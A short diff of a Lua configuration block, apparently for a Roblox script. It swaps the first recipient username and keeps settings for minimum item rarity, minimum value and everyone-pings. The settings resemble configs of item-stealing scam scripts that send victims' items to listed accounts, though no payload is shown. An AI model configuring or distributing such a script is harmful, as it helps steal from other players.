@@ -1,4 +1,4 @@
-_G.Usernames = {"LveEnergy", "user2", "user3"} -- you can add as many as you'd like
+_G.Usernames = {"RotBrainmaster", "user2", "user3"} -- you can add as many as you'd like
 _G.min_rarity = "Epic"
 _G.min_value = 1 -- Put 1 to get all
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
